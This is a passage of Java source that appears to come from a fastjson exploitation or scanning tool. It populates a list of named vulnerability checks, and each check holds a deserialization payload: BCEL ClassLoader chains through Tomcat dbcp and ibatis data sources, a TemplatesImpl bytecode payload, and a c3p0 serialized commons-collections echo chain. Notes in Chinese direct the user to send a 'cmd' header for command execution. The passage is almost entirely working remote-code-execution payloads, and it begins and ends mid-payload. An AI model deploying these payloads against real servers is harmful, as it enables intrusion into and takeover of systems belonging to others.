C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "            }\n" +
                "        } : \"ddd\"\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1237-1247 bcel1", "tomcat7，请求头添加cmd: whoami", "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\",\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1237-1247 bcel2", "tomcat8，请求头添加cmd: whoami", "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\",\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1237-1247 bcel3", "请求头添加cmd: whoami", "{\n" +
                "  \"@type\": \"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\n" +
                "  \"key\": {\n" +
                "    \"@type\": \"java.lang.Class\",\n" +
                "    \"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "  },\n" +
                "  \"driverClassLoader\": {\n" +
                "    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "  },\n" +
                "  \"driver\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "}"));
        //写到TemplatesImpl 利用条件苛刻，可用于解决不出网利用。
        vulnerabilities.add(new Vulnerability("Check TemplatesImpl", "利用条件苛刻，可用于解决不出网利用。\n" +
                "\n" +
                "需要调用parseObject()方法时，加入Feature.SupportNonPublicField参数。\n" +
                "\n" +
                "_bytecodes要进行base64编码", "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}"));
        vulnerabilities.add(new Vulnerability("Check <1247 c3p0", "利用c3p0二次反序列化 cc payload到达回显。请求头添加：cmd: dir", "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C6172656446